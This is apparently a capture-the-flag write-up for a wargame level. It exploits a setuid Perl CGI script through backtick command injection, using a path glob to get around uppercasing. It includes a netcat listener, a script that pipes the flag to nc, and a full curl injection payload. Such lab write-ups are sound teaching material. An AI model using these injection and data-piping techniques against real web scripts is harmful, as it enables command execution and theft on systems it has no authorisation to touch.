## level12

1. Check files in current working directory (home dir)
    - `-rwsr-sr-x+ 1 flag12  level12  464 Mar  5  2016 level12.pl*`

Pretty much the same issue as before, but this time we got a little bit outplayed.

1. Our input is transformed to uppercase
2. Our input then gets all its spaces removed

So, it's getting a bit more complex.

### Opening a netcat server

Using tmux split panes :

```bash
nc -kl 12345
```

### Exploiting

Well actually I spent a bit of time to understand what was going on, but it's pretty simple.

Basically, the perl script is using `egrep`, and this is completely unrelated. In fact, the real problem are the backticks in the perl script, they are used to execute a command and get its output.

Since our input (transformed indeed, but still our input) is passed between backticks, we can execute a command.

But no interesting commands are written in uppercase, we can't just use the `getflag` command because it gets turned into `GETFLAG` and it doesn't exist.

So we can use a shell script and store it into `/tmp/` but here again it would get turned into `/TMP/` and it wouldn't work.

So let me introduce you to globbing, which is a way of matching files using wildcards, more specifically the `*` wildcard.

#### Creating the script

```bash
#!/bin/bash
getflag | nc 127.0.0.1 12345
```

Store this into `/tmp/PWN` and make it executable using the `chmod +x /tmp/PWN` command.

#### Getting the script to run

Now we need our perl CGI to execute our command, `/tmp/` would get turned into `/TMP/` so, we'll use `/*/` which will try to find a `PWN` file in every directories in the root directory.

So we just need to run an HTTP GET request like this : 

```bash
curl 'http://127.0.0.1:4646/?x="`/*/PWN`"'
```

and we get the flag. (that's indeed a lot of quotes & ticks)